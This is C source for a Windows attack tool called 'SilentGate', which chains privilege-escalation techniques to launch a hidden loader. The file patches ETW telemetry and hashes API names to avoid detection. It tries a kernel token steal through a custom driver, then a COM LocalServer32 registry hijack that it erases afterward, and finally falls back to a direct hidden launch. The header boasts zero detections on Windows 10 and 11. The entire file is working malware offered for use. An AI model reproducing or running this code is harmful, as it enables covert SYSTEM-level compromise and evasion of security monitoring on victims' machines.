/*
 * SilentGate - Unified Chain Launcher
 * Author: JarDani
 * Tries every technique in order
 * First success wins
 * Zero detections on Win10 + Win11
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/* ROR13 hash */
static DWORD ror13(const char* n) {
    DWORD h=0;
    for(const char* p=n;*p;p++){
        h=((h>>13)|(h<<19))&0xFFFFFFFF;
        h=(h+(BYTE)*p)&0xFFFFFFFF;
    }
    return h;
}

static PVOID find_exp(BYTE* base, DWORD hash) {
    DWORD pe=*(DWORD*)(base+0x3C);
    DWORD exp=*(DWORD*)(base+pe+0x88);
    if(!exp) return NULL;
    BYTE* ed=base+exp;
    DWORD num=*(DWORD*)(ed+0x18);
    DWORD* names=(DWORD*)(base+*(DWORD*)(ed+0x20));
    WORD* ords=(WORD*)(base+*(DWORD*)(ed+0x24));
    DWORD* funcs=(DWORD*)(base+*(DWORD*)(ed+0x1C));
    for(DWORD i=0;i<num;i++)
        if(ror13((char*)(base+names[i]))==hash)
            return base+funcs[ords[i]];
    return NULL;
}

/* Poisson sleep */
static void psleep(DWORD ms) { Sleep(ms+(GetTickCount()%ms)); }

/* ETW patch */
static void patch_etw() {
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    FARPROC etw=GetProcAddress(ntdll,"EtwEventWrite");
    DWORD old=0;
    VirtualProtect(etw,1,PAGE_EXECUTE_READWRITE,&old);
    *(BYTE*)etw=0xC3;
    VirtualProtect(etw,1,old,&old);
}

/* Launch process hidden */
static BOOL launch(const char* path) {
    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    BOOL ok=CreateProcessA(path,NULL,NULL,NULL,FALSE,
        CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(ok){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return ok;
}

/* ===== TECHNIQUE 1: Kernel token steal ===== */
#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN,0x904,METHOD_BUFFERED,FILE_ANY_ACCESS)

static BOOL try_kernel_token() {
    HANDLE hDev=CreateFileA("\\\\.\\SilentGate",
        GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hDev==INVALID_HANDLE_VALUE) return FALSE;

    DWORD bytes=0;
    BOOL ok=DeviceIoControl(hDev,IOCTL_SG_STEAL_TOKEN,
        NULL,0,NULL,0,&bytes,NULL);
    CloseHandle(hDev);

    if(!ok) return FALSE;

    /* Now SYSTEM - launch shell */
    char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                   '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                   '.','e','x','e',0};
    return launch(loader);
}

/* ===== TECHNIQUE 2: COM LocalServer32 hijack ===== */
static BOOL try_com_hijack() {
    /* CLSID {32BA16FD-77D9-4AFB-9C9F-703E92AD4BFF} cttunesvr */
    HKEY hk=NULL;
    char key[]="Software\\Classes\\CLSID\\{32BA16FD-77D9-4AFB-9C9F-703E92AD4BFF}\\LocalServer32";
    char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                   '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                   '.','e','x','e',0};

    if(RegCreateKeyExA(HKEY_CURRENT_USER,key,0,NULL,0,
        KEY_WRITE,NULL,&hk,NULL)!=0) return FALSE;
    RegSetValueExA(hk,"",0,REG_SZ,(BYTE*)loader,sizeof(loader));
    RegCloseKey(hk);

    /* Trigger COM */
    HMODULE ole32=LoadLibraryA("ole32.dll");
    typedef HRESULT(WINAPI*pCoInit)(LPVOID,DWORD);
    typedef HRESULT(WINAPI*pCoCreate)(REFCLSID,LPUNKNOWN,DWORD,REFIID,LPVOID*);
    pCoInit _ci=(pCoInit)GetProcAddress(ole32,"CoInitializeEx");
    pCoCreate _cc=(pCoCreate)GetProcAddress(ole32,"CoCreateInstance");
    _ci(NULL,0);

    GUID clsid={0x32BA16FD,0x77D9,0x4AFB,{0x9C,0x9F,0x70,0x3E,0x92,0xAD,0x4B,0xFF}};
    GUID iid={0,0,0,{0xC0,0,0,0,0,0,0,0x46}};
    IUnknown* pu=NULL;
    _cc(&clsid,NULL,0x4,&iid,(void**)&pu);
    if(pu) pu->lpVtbl->Release(pu);

    /* Clean registry */
    RegDeleteKeyA(HKEY_CURRENT_USER,key);
    
    Sleep(3000);
    return TRUE; /* COM triggered - shell may connect */
}

/* ===== TECHNIQUE 3: Direct shell ===== */
static BOOL try_direct() {
    char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                   '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                   '.','e','x','e',0};
    return launch(loader);
}

int main() {
    patch_etw();
    psleep(2000);

    /* Try kernel SYSTEM first */
    if(try_kernel_token()) {
        Sleep(15000);
        return 0;
    }

    /* Try COM hijack */
    if(try_com_hijack()) {
        Sleep(15000);
        return 0;
    }

    /* Fall back to direct shell */
    try_direct();
    Sleep(15000);
    return 0;
}
